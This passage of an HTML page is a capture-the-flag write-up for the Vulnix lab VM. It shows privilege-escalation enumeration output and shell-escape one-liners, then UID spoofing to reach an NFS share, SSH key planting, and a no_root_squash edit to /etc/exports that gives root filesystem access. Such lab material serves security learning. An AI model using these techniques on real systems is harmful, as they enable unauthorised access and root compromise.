+    pciutils 1:3.1.8-2ubuntu5  PCI Utilities
+    perl 5.14.2-6ubuntu2.1  Wall's Practical Extraction and Report Language
+    perl-base 5.14.2-6ubuntu2.1  Perl system
+    perl-modules 5.14.2-6ubuntu2.1  Perl modules
+    plymouth 0.8.2-2ubuntu30  boot animation and logger - main package
+    plymouth-theme-ubuntu-text 0.8.2-2ubuntu30  boot animation and logger - ubuntu-logo theme
+    popularity-contest 1.53ubuntu1  for your favourite packages automatically
+    postfix 2.9.3-2~12.04.2  mail transport agent
+    powermgmt-base 1.31  utils and configs for power management
+    ppp 2.4.5-5ubuntu1  Protocol (PPP) - daemon
+    pppconfig 2.3.18+nmu3ubuntu1  text menu based utility for configuring ppp
+    pppoeconf 1.20ubuntu1  PPPoE/ADSL connections
+    procmail 3.22-19  e-mail processor
+    procps 1:3.2.8-11ubuntu6  file system utilities
+    psmisc 22.15-2ubuntu1.1  that use the proc file system
+    python 2.7.3-0ubuntu2  high-level object-oriented language (default version)
+    python-apport 2.0.1-0ubuntu12  crash report handling library
+    python-apt 0.8.3ubuntu7  interface to libapt-pkg
+    python-apt-common 0.8.3ubuntu7  interface to libapt-pkg (locales)
+    python-chardet 2.0.1-2build1  character encoding detector
+    python-crypto 2.4.1-1ubuntu0.1  algorithms and protocols for Python
+    python-dbus 1.0.0-1ubuntu1  interprocess messaging system (Python interface)
+    python-dbus-dev 1.0.0-1ubuntu1  loop integration development files for python-dbus
+    python-debian 0.1.21ubuntu1  modules to work with Debian-related data formats
+    python-gdbm 2.7.3-1ubuntu1  dbm database support for Python
+    python-gi 3.2.2-1~precise  2.x bindings for gobject-introspection libraries
+    python-gnupginterface 0.3.2-9.1ubuntu3  interface to GnuPG (GPG)
+    python-httplib2 0.7.2-1ubuntu2  HTTP client library written for Python
+    python-keyring 0.7.1-1fakesync1  and access your passwords safely
+    python-launchpadlib 1.9.12-1  web services client library
+    python-lazr.restfulclient 0.12.0-1ubuntu1  for lazr.restful-based web services
+    python-lazr.uri 1.0.3-1  for parsing, manipulating, and generating URIs
+    python-minimal 2.7.3-0ubuntu2  subset of the Python language (default version)
+    python-newt 0.52.11-2ubuntu10  NEWT module for Python
+    python-oauth 1.0.1-3build1  library implementing of the OAuth protocol
+    python-openssl 0.12-1ubuntu2  wrapper around the OpenSSL library
+    python-pam 0.4.2-12.2ubuntu4  Python interface to the PAM library
+    python-pkg-resources 0.6.24-1ubuntu1  Discovery and Resource Access using pkg_resources
+    python-problem-report 2.0.1-0ubuntu12  library to handle problem reports
+    python-serial 2.5-2.1build1  - module encapsulating access for the serial port
+    python-simplejson 2.3.2-1  fast, extensible JSON encoder/decoder for Python
+    python-twisted-bin 11.1.0-1ubuntu2  framework for internet applications
+    python-twisted-core 11.1.0-1ubuntu2  framework for internet applications
+    python-wadllib 1.3.0-2  library for navigating WADL files
+    python-xapian 1.2.8-1  search engine interface for Python
+    python-zope.interface 3.6.1-1ubuntu3  for Python
+    python2.7 2.7.3-0ubuntu3.1  high-level object-oriented language (version 2.7)
+    python2.7-minimal 2.7.3-0ubuntu3.1  subset of the Python language (version 2.7)
+    readline-common 6.2-8  readline and history libraries, common files
+    resolvconf 1.63ubuntu15  server information handler
+    rpcbind 0.2.0-7ubuntu1.1  RPC program numbers into universal addresses
+    rsh-server 0.17-15  program for remote shell connections
+    rsync 3.0.9-1ubuntu1  versatile, remote (and local) file-copying tool
+    rsyslog 5.8.6-1ubuntu8  system and kernel logging daemon
+    screen 4.0.3-14ubuntu8  multiplexor with VT100/ANSI terminal emulation
+    sed 4.2.1-9  GNU sed stream editor
+    sensible-utils 0.0.6ubuntu2  for sensible alternative selection
+    sgml-base 1.26+nmu1ubuntu1  infrastructure and SGML catalog file support
+    ssh-import-id 2.10-0ubuntu1  retrieve an SSH public key and install it locally
+    ssl-cert 1.0.28ubuntu0.1  debconf wrapper for OpenSSL
+    strace 4.5.20-2.3ubuntu1  system call tracer
+    sudo 1.8.3p1-1ubuntu3.3  limited super user privileges to specific users
+    sysv-rc 2.88dsf-13.10ubuntu11.1  runlevel change mechanism
+    sysvinit-utils 2.88dsf-13.10ubuntu11.1  utilities
+    tar 1.26-4ubuntu1  version of the tar archiving utility
+    tasksel 2.88ubuntu9  for selecting tasks for installation on Debian systems
+    tasksel-data 2.88ubuntu9  tasks used for installation of Debian systems
+    tcpd 7.6.q-21  Venema's TCP wrapper utilities
+    tcpdump 4.2.1-1ubuntu2  network traffic analyzer
+    telnet 0.17-36build1  telnet client
+    time 1.7-23.1  GNU time program for measuring cpu resource usage
+    tmux 1.6-1ubuntu1  multiplexer
+    tzdata 2012e-0ubuntu0.12.04  zone and daylight-saving time data
+    ubuntu-keyring 2011.11.21  keys of the Ubuntu archive
+    ubuntu-minimal 1.267  core of Ubuntu
+    ubuntu-standard 1.267  Ubuntu standard system
+    ucf 3.0025+nmu2ubuntu1  Configuration File: preserve user changes to config files.
+    udev 175-0ubuntu9.1  device node and kernel event manager
+    ufw 0.31.1-1  for managing a Netfilter firewall
+    update-inetd 4.41  configuration file updater
+    update-manager-core 1:0.156.14.9  release upgrades
+    update-notifier-common 0.119ubuntu8.5  shared between update-notifier and other packages
+    upstart 1.5-0ubuntu7  init daemon
+    ureadahead 0.100.0-12  required files in advance
+    usbutils 1:005-1  USB utilities
+    util-linux 2.20.1-1ubuntu3  system utilities
+    uuid-runtime 2.20.1-1ubuntu3  components for the Universally Unique ID library
+    vim 2:7.3.429-2ubuntu2.1  IMproved - enhanced vi editor
+    vim-common 2:7.3.429-2ubuntu2.1  IMproved - Common files
+    vim-runtime 2:7.3.429-2ubuntu2.1  IMproved - Runtime files
+    vim-tiny 2:7.3.429-2ubuntu2.1  IMproved - enhanced vi editor - compact version
+    w3m 0.5.3-5ubuntu1  browsable pager with excellent tables/frames support
+    watershed 6  superfluous executions of idempotent command
+    wget 1.13.4-2ubuntu1  files from the web
+    whiptail 0.52.11-2ubuntu10  user-friendly dialog boxes from shell scripts
+    whoopsie 0.1.32  crash database submission daemon
+    wireless-regdb 2011.04.28-1ubuntu3  regulatory database
+    wireless-tools 30~pre9-5ubuntu2  for manipulating Linux Wireless Extensions
+    wpasupplicant 0.7.3-6ubuntu2  support for WPA and WPA2 (IEEE 802.11i)
+    xauth 1:1.0.6-1  authentication utility
+    xkb-data 2.5-1ubuntu1.3  Keyboard Extension (XKB) configuration data
+    xml-core 0.13  infrastructure and XML catalog file support
+    xz-lzma 5.1.1alpha+20110809-3  compression utilities - compatibility commands
+    xz-utils 5.1.1alpha+20110809-3  compression utilities
+    zlib1g 1:1.2.3.4.dfsg-3ubuntu4  library - runtime
+
+[+] Current processes
+    USER PID START TIME COMMAND
+    root 1 11:51 0:25 /sbin/init
+    root 2 11:51 0:00 [kthreadd]
+    root 3 11:51 0:05 [ksoftirqd/0]
+    root 6 11:51 0:00 [migration/0]
+    root 7 11:51 0:02 [watchdog/0]
+    root 8 11:51 0:00 [cpuset]
+    root 9 11:51 0:00 [khelper]
+    root 10 11:51 0:00 [kdevtmpfs]
+    root 11 11:51 0:00 [netns]
+    root 12 11:51 0:01 [sync_supers]
+    root 13 11:51 0:00 [bdi-default]
+    root 14 11:51 0:00 [kintegrityd]
+    root 15 11:51 0:00 [kblockd]
+    root 16 11:51 0:00 [ata_sff]
+    root 17 11:51 0:01 [khubd]
+    root 18 11:51 0:00 [md]
+    root 22 11:51 0:00 [khungtaskd]
+    root 23 11:51 0:00 [kswapd0]
+    root 24 11:51 0:00 [ksmd]
+    root 25 11:51 0:00 [fsnotify_mark]
+    root 26 11:51 0:00 [ecryptfs-kthrea]
+    root 27 11:51 0:00 [crypto]
+    root 35 11:51 0:00 [kthrotld]
+    root 39 11:51 0:00 [scsi_eh_0]
+    root 40 11:51 0:00 [scsi_eh_1]
+    root 41 11:51 0:00 [scsi_eh_2]
+    root 63 11:51 0:00 [devfreq_wq]
+    root 217 11:51 0:00 [kdmflush]
+    root 227 11:51 0:00 [kdmflush]
+    root 239 11:51 0:01 [jbd2/dm-0-8]
+    root 240 11:51 0:00 [ext4-dio-unwrit]
+    root 433 11:51 0:00 upstart-udev-bridge
+    root 435 11:51 0:00 /sbin/udevd
+    root 532 11:51 0:00 [kpsmoused]
+    root 534 11:51 0:00 /sbin/udevd
+    root 535 11:51 0:00 /sbin/udevd
+    root 625 11:51 0:00 rpcbind
+    root 632 11:51 0:00 upstart-socket-bridge
+    root 685 11:51 0:00 dhclient3
+    102 760 11:51 0:00 dbus-daemon
+    root 783 11:51 6:43 /usr/sbin/sshd
+    root 788 11:51 0:00 [rpciod]
+    syslog 801 11:51 0:26 rsyslogd
+    statd 809 11:51 0:00 rpc.statd
+    root 848 11:51 0:00 [nfsiod]
+    root 855 11:51 0:00 rpc.idmapd
+    root 877 11:51 0:00 /sbin/getty
+    root 882 11:51 0:00 /sbin/getty
+    root 889 11:51 0:00 /sbin/getty
+    root 891 11:51 0:00 /sbin/getty
+    root 895 11:51 0:00 /sbin/getty
+    root 910 11:51 0:00 /usr/sbin/dovecot
+    whoopsie 912 11:51 0:00 whoopsie
+    root 913 11:51 0:00 acpid
+    root 915 11:51 0:00 cron
+    daemon 916 11:51 0:00 atd
+    root 918 11:51 0:00 /usr/sbin/inetutils-inetd
+    dovecot 933 11:51 0:00 dovecot/anvil
+    root 934 11:51 0:00 dovecot/log
+    root 975 11:51 0:00 [lockd]
+    root 976 11:51 0:00 [nfsd4]
+    root 977 11:51 0:00 [nfsd4_callbacks]
+    root 978 11:51 0:00 [nfsd]
+    root 979 11:51 0:00 [nfsd]
+    root 980 11:51 0:00 [nfsd]
+    root 981 11:51 0:00 [nfsd]
+    root 982 11:51 0:00 [nfsd]
+    root 983 11:51 0:00 [nfsd]
+    root 984 11:51 0:00 [nfsd]
+    root 985 11:51 0:00 [nfsd]
+    root 989 11:51 0:00 /usr/sbin/rpc.mountd
+    root 1025 11:51 0:01 [flush-252:0]
+    root 1095 11:51 0:00 /usr/lib/postfix/master
+    postfix 1099 11:51 0:00 qmgr
+    root 1137 11:51 0:00 /sbin/getty
+    postfix 1152 11:53 0:00 tlsmgr
+    root 1456 15:13 0:00 [kworker/u:2]
+    root 13429 16:50 0:00 [kworker/u:0]
+    root 13430 16:50 0:05 [kworker/0:2]
+    postfix 13431 16:51 0:00 pickup
+    root 13441 16:55 0:01 [kworker/0:1]
+    root 13442 17:00 0:04 [kworker/0:0]
+    root 13453 17:04 0:00 sshd:
+    user 13577 17:04 0:00 sshd:
+    user 13578 17:04 0:00 -bash
+    user 13683 17:05 0:00 python
+    user 13942 17:05 0:00 /bin/sh
+    user 13943 17:05 0:00 ps
+    user 13944 17:05 0:00 awk
+
+[+] Apache Version and Modules
+
+[+] Apache Config File
+
+[+] Sudo Version (Check out http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=sudo)
+    Sudo version 1.8.3p1
+    Sudoers policy plugin version 1.8.3p1
+    Sudoers file grammar version 40
+    Sudoers I/O plugin version 1.8.3p1
+
+[*] IDENTIFYING PROCESSES AND PACKAGES RUNNING AS ROOT OR OTHER SUPERUSER...
+
+    root 984 11:51 0:00 [nfsd]
+    root 985 11:51 0:00 [nfsd]
+    root 35 11:51 0:00 [kthrotld]
+    root 913 11:51 0:00 acpid
+        Possible Related Packages: 
+             acpid 1:2.0.10-1ubuntu3  Configuration and Power Interface event daemon
+    root 16 11:51 0:00 [ata_sff]
+    root 8 11:51 0:00 [cpuset]
+    root 534 11:51 0:00 /sbin/udevd
+    root 989 11:51 0:00 /usr/sbin/rpc.mountd
+    root 13453 17:04 0:00 sshd:
+    root 12 11:51 0:01 [sync_supers]
+    root 13 11:51 0:00 [bdi-default]
+    root 910 11:51 0:00 /usr/sbin/dovecot
+        Possible Related Packages: 
+             dovecot-core 1:2.0.19-0ubuntu2  mail server that supports mbox, maildir, dbox and mdbox mailboxes
+             dovecot-imapd 1:2.0.19-0ubuntu2  IMAP server that supports mbox, maildir, dbox and mdbox mailboxes
+             dovecot-pop3d 1:2.0.19-0ubuntu2  POP3 server that supports mbox, maildir, dbox and mdbox mailboxes
+    root 1025 11:51 0:01 [flush-252:0]
+    root 15 11:51 0:00 [kblockd]
+    root 882 11:51 0:00 /sbin/getty
+    root 240 11:51 0:00 [ext4-dio-unwrit]
+    root 433 11:51 0:00 upstart-udev-bridge
+    root 895 11:51 0:00 /sbin/getty
+    root 22 11:51 0:00 [khungtaskd]
+    root 934 11:51 0:00 dovecot/log
+        Possible Related Packages: 
+             libparse-debianchangelog-perl 1.2.0-1ubuntu1  Debian changelogs and output them in other formats
+             libplymouth2 0.8.2-2ubuntu30  boot animation and logger - shared libraries
+             login 1:4.1.4.2+svn3283-3ubuntu5  login tools
+             logrotate 3.7.8-6ubuntu5  rotation utility
+             plymouth 0.8.2-2ubuntu30  boot animation and logger - main package
+             plymouth-theme-ubuntu-text 0.8.2-2ubuntu30  boot animation and logger - ubuntu-logo theme
+             rsyslog 5.8.6-1ubuntu8  system and kernel logging daemon
+             sgml-base 1.26+nmu1ubuntu1  infrastructure and SGML catalog file support
+             whiptail 0.52.11-2ubuntu10  user-friendly dialog boxes from shell scripts
+             xml-core 0.13  infrastructure and XML catalog file support
+    root 1 11:51 0:25 /sbin/init
+        Possible Related Packages: 
+             busybox-initramfs 1:1.18.5-1ubuntu4  shell setup for initramfs
+             initramfs-tools 0.99ubuntu13  for generating an initramfs
+             initramfs-tools-bin 0.99ubuntu13  used by initramfs-tools
+             initscripts 2.88dsf-13.10ubuntu11.1  for initializing and shutting down the system
+             insserv 1.14.0-2.1ubuntu2  to organize boot sequence using LSB init.d script dependencies
+             libklibc 1.5.25-1ubuntu2  libc subset for use with initramfs
+             lsb-base 4.0-0ubuntu20  Standard Base 4.0 init script functionality
+             module-init-tools 3.16-1ubuntu2  for managing Linux kernel modules
+             ncurses-base 5.9-4  terminal type definitions
+             sysvinit-utils 2.88dsf-13.10ubuntu11.1  utilities
+             upstart 1.5-0ubuntu7  init daemon
+    root 981 11:51 0:00 [nfsd]
+    root 535 11:51 0:00 /sbin/udevd
+    root 632 11:51 0:00 upstart-socket-bridge
+    root 24 11:51 0:00 [ksmd]
+    root 889 11:51 0:00 /sbin/getty
+    root 25 11:51 0:00 [fsnotify_mark]
+    root 848 11:51 0:00 [nfsiod]
+    root 6 11:51 0:00 [migration/0]
+    root 1137 11:51 0:00 /sbin/getty
+    root 26 11:51 0:00 [ecryptfs-kthrea]
+    root 982 11:51 0:00 [nfsd]
+    root 39 11:51 0:00 [scsi_eh_0]
+    root 855 11:51 0:00 rpc.idmapd
+    root 13429 16:50 0:00 [kworker/u:0]
+    root 9 11:51 0:00 [khelper]
+    root 13442 17:00 0:04 [kworker/0:0]
+    root 979 11:51 0:00 [nfsd]
+    root 976 11:51 0:00 [nfsd4]
+    root 63 11:51 0:00 [devfreq_wq]
+    root 17 11:51 0:01 [khubd]
+    root 532 11:51 0:00 [kpsmoused]
+    root 2 11:51 0:00 [kthreadd]
+    root 10 11:51 0:00 [kdevtmpfs]
+    root 7 11:51 0:02 [watchdog/0]
+    root 27 11:51 0:00 [crypto]
+    root 239 11:51 0:01 [jbd2/dm-0-8]
+    root 435 11:51 0:00 /sbin/udevd
+    root 23 11:51 0:00 [kswapd0]
+    root 891 11:51 0:00 /sbin/getty
+    root 11 11:51 0:00 [netns]
+    root 625 11:51 0:00 rpcbind
+        Possible Related Packages: 
+             rpcbind 0.2.0-7ubuntu1.1  RPC program numbers into universal addresses
+    root 13441 16:55 0:01 [kworker/0:1]
+    root 918 11:51 0:00 /usr/sbin/inetutils-inetd
+        Possible Related Packages: 
+             inetutils-inetd 2:1.8-6  super server
+    root 915 11:51 0:00 cron
+        Possible Related Packages: 
+             cron 3.0pl1-120ubuntu4  scheduling daemon
+    root 877 11:51 0:00 /sbin/getty
+    root 1095 11:51 0:00 /usr/lib/postfix/master
+        Possible Related Packages: 
+             base-passwd 3.5.24  base system master password and group files
+    root 783 11:51 6:43 /usr/sbin/sshd
+    root 685 11:51 0:00 dhclient3
+    root 3 11:51 0:05 [ksoftirqd/0]
+    root 14 11:51 0:00 [kintegrityd]
+    root 227 11:51 0:00 [kdmflush]
+    root 1456 15:13 0:00 [kworker/u:2]
+    root 18 11:51 0:00 [md]
+    root 788 11:51 0:00 [rpciod]
+    root 983 11:51 0:00 [nfsd]
+    root 977 11:51 0:00 [nfsd4_callbacks]
+    root 40 11:51 0:00 [scsi_eh_1]
+    root 975 11:51 0:00 [lockd]
+    root 41 11:51 0:00 [scsi_eh_2]
+    root 980 11:51 0:00 [nfsd]
+    root 13430 16:50 0:05 [kworker/0:2]
+    root 217 11:51 0:00 [kdmflush]
+    root 978 11:51 0:00 [nfsd]
+
+[*] ENUMERATING INSTALLED LANGUAGES/TOOLS FOR SPLOIT BUILDING...
+
+[+] Installed Tools
+    /usr/bin/awk
+    /usr/bin/perl
+    /usr/bin/python
+    /usr/bin/vi
+    /usr/bin/vim
+    /usr/bin/find
+    /bin/netcat
+    /bin/nc
+    /usr/bin/wget
+    /usr/bin/ftp
+
+[+] Related Shell Escape Sequences...
+
+    vi-->	:!bash
+    vi-->	:set shell=/bin/bash:shell
+    vi-->	:!bash
+    vi-->	:set shell=/bin/bash:shell
+    awk-->	awk 'BEGIN {system("/bin/bash")}'
+    find-->	find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' \;
+    perl-->	perl -e 'exec "/bin/bash";'
+
+[*] FINDING RELEVENT PRIVILEGE ESCALATION EXPLOITS...
+
+    Note: Exploits relying on a compile/scripting language not detected on this system are marked with a '**' but should still be tested!
+
+    The following exploits are ranked higher in probability of success because this script detected a related running process, OS, or mounted file system
+
+    The following exploits are applicable to this kernel version and should be investigated as well
+    - Kernel ia32syscall Emulation Privilege Escalation || http://www.exploit-db.com/exploits/15023 || Language=c
+    - Sendpage Local Privilege Escalation || http://www.exploit-db.com/exploits/19933 || Language=ruby**
+    - CAP_SYS_ADMIN to Root Exploit 2 (32 and 64-bit) || http://www.exploit-db.com/exploits/15944 || Language=c
+    - CAP_SYS_ADMIN to root Exploit || http://www.exploit-db.com/exploits/15916 || Language=c
+    - MySQL 4.x/5.0 User-Defined Function Local Privilege Escalation Exploit || http://www.exploit-db.com/exploits/1518 || Language=c
+    - open-time Capability file_ns_capable() Privilege Escalation || http://www.exploit-db.com/exploits/25450 || Language=c
+    - open-time Capability file_ns_capable() - Privilege Escalation Vulnerability || http://www.exploit-db.com/exploits/25307 || Language=c
+
+Finished
+=================================================================================================
+</pre>
+<p><font size="3.5" color="black">Nothing interesting except for the fact that vulnix's owner and group ID’s are set to 2008.</font></p>
+<p><font size="3.5" color="black">Creation of a user with those attributes gives an option to "cd" into vulnix's share on my local host:</font></p>
+<pre style="background-color:black;color:white;">
+[GandoPC ~]# useradd vulnix -u 2008
+[GandoPC ~]# su vulnix
+[vulnix@GandoPC root]$ cd /mnt/home/vulnix;ls -aul
+total 20
+drwxr-x--- 2 vulnix vulnix 4096 Oct 20 01:31 .
+drwxr-xr-x 3 root   root   4096 Aug  7 17:34 ..
+-rw-r--r-- 1 vulnix vulnix  220 Sep  2  2012 .bash_logout
+-rw-r--r-- 1 vulnix vulnix 3486 Sep  2  2012 .bashrc
+-rw-r--r-- 1 vulnix vulnix  675 Sep  2  2012 .profile
+</pre>
+<hr>
+<br>
+<br>
+<p><h3>Gaining SSH access with "vulnix" user:</h3></p>
+<hr>
+<p><font size="3.5" color="black">Creation of a public/private rsa key pair and copying the public key to the authorized hosts file on the vulnix host:</font></p>
+<pre style="background-color:black;color:white;">
+[vulnix@GandoPC vulnix]$ ssh-keygen 
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/vulnix/.ssh/id_rsa): id_rsa
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in id_rsa.
+Your public key has been saved in id_rsa.pub.
+The key fingerprint is:
+SHA256:ZDJcOnqM13e14G7mMI73sRKZT73V+YCRgQRDSNjIqV8 vulnix@GandoPC
+The key's randomart image is:
++---[RSA 2048]----+
+|   . *.o=o..     |
+|    =.oo .. .    |
+|   .  * o   .o.  |
+|  .  +EB   .oo . |
+|   .o.+ S .oo+. o|
+|    .o   .+oo o.o|
+|          o+=  +.|
+|         oo*.o. .|
+|        ...o+    |
++----[SHA256]-----+
+[vulnix@GandoPC vulnix]$ cat id_rsa
+id_rsa      id_rsa.pub  
+[vulnix@GandoPC vulnix]$ cat id_rsa.pub > .ssh/authorized_keys
+</pre>
+<p><font size="3.5" color="black">Gaining access to the host using SSH and the private key that was generated:</font></p>
+<pre style="background-color:black;color:white;">
+[vulnix@GandoPC vulnix]$ ssh -i id_rsa vulnix@192.168.43.4
+The authenticity of host '192.168.43.4 (192.168.43.4)' can't be established.
+ECDSA key fingerprint is SHA256:IGOuLMZRTuUvY58a8TN+ef/1zyRCAHk0qYP4wMViOAg.
+Are you sure you want to continue connecting (yes/no)? yes
+Failed to add the host to the list of known hosts (/home/vulnix/.ssh/known_hosts).
+Welcome to Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-29-generic-pae i686)
+
+ * Documentation:  https://help.ubuntu.com/
+
+  System information as of Sat Oct 20 00:27:21 BST 2018
+
+  System load:  0.0              Processes:           88
+  Usage of /:   90.2% of 773MB   Users logged in:     0
+  Memory usage: 4%               IP address for eth0: 192.168.43.4
+  Swap usage:   0%
+
+  => / is using 90.2% of 773MB
+
+  Graph this data and manage this system at https://landscape.canonical.com/
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Last login: Sat Oct 20 00:16:28 2018 from 192.168.43.3
+vulnix@vulnix:~$ whoami;ifconfig 
+vulnix
+eth0      Link encap:Ethernet  HWaddr 08:00:27:59:f8:53  
+          inet addr:192.168.43.4  Bcast:192.168.43.255  Mask:255.255.255.0
+          inet6 addr: fe80::a00:27ff:fe59:f853/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:2670 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:1176 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:336606 (336.6 KB)  TX bytes:222571 (222.5 KB)
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:40 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:40 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:3256 (3.2 KB)  TX bytes:3256 (3.2 KB)
+</pre>
+<p><font size="3.5" color="black">I did some manual enumeration and I found this:</font></p>
+<pre style="background-color:black;color:white;">
+vulnix@vulnix:~$ sudo -l
+Matching 'Defaults' entries for vulnix on this host:
+    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User vulnix may run the following commands on this host:
+    (root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports
+vulnix@vulnix:~$ cat /etc/exports 
+# /etc/exports: the access control list for filesystems which may be exported
+#		to NFS clients.  See exports(5).
+#
+# Example for NFSv2 and NFSv3:
+# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
+#
+# Example for NFSv4:
+# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
+# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
+#
+/home/vulnix	*(rw,root_squash)
+</pre>
+<p><font size="3.5" color="black">I turned off root_squash in /etc/exports:</font></p>
+<pre style="background-color:black;color:white;">
+vulnix@vulnix:~$ sudoedit /etc/exports
+vulnix@vulnix:~$ cat /etc/exports
+# /etc/exports: the access control list for filesystems which may be exported
+#		to NFS clients.  See exports(5).
+#
+# Example for NFSv2 and NFSv3:
+# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
+#
+# Example for NFSv4:
+# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
+# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
+#
+/	*(rw,no_root_squash)
+</pre>
+<p><font size="3.5" color="black">In order to save those changes, I had to restart exportfs service or reboot the machine:</font></p>
+<pre style="background-color:black;color:white;">
+vulnix@vulnix:~$ reboot 
+reboot: Need to be root
+vulnix@vulnix:~$ exit
+logout
+Connection to 192.168.43.4 closed.
+[vulnix@GandoPC vulnix]$ exit
+exit
+</pre>
+<p><font size="3.5" color="black">No sudo, so I had to restart the VM in virtualbox :D</font></p>
+<hr>
+<br>
+<br>
+<p><h3>Capturing the trophy:</h3></p>
+<hr>
+<p><font size="3.5" color="black">Vulnix VM restarted successfully and I got the trophy:</font></p>
+<pre style="background-color:black;color:white;">
+[GandoPC ~]# umount /mnt/home/vulnix 
+[GandoPC ~]# showmount -e 192.168.43.4
+Export list for 192.168.43.4:
+/ *
+[GandoPC ~]# mkdir /mnt/vulnix_root
+[GandoPC ~]# mount 192.168.43.4:/ /mnt/vulnix_root
+[GandoPC ~]# cd /mnt/vulnix_root/root;ls -aul
+total 28
+drwx------  3 root root 4096 Oct 20 02:52 .
+drwxr-xr-x 22 root root 4096 Oct 20 02:49 ..
+-rw-------  1 root root    0 Sep  2  2012 .bash_history
+-rw-r--r--  1 root root 3106 Sep  2  2012 .bashrc
+drwx------  2 root root 4096 Sep  2  2012 .cache
+-rw-r--r--  1 root root  140 Sep  2  2012 .profile
+-r--------  1 root root   33 Sep  2  2012 trophy.txt
+-rw-------  1 root root  710 Sep  2  2012 .viminfo
+[GandoPC root]# cat trophy.txt 
+cc614640424f5bd60ce5d5264899c3be
+</pre>
+
+
+</div>
+</div>
+
+<div class="about-me-area section-padding-100 clearfix">
+<div class="container-fluid">
+
+
+
+
+
+<!-- ##### All Javascript Files ##### -->
+<!-- jQuery-2.2.4 js -->
+<script src="js/jquery/jquery-2.2.4.min.js"></script>
+<!-- Popper js -->
+<script src="js/bootstrap/popper.min.js"></script>
+<!-- Bootstrap js -->
+<script src="js/bootstrap/bootstrap.min.js"></script>
+<!-- All Plugins js -->
+<script src="js/plugins/plugins.js"></script>
+<!-- Active js -->
+<script src="js/active.js"></script>
+
+</body>
+
+</html>
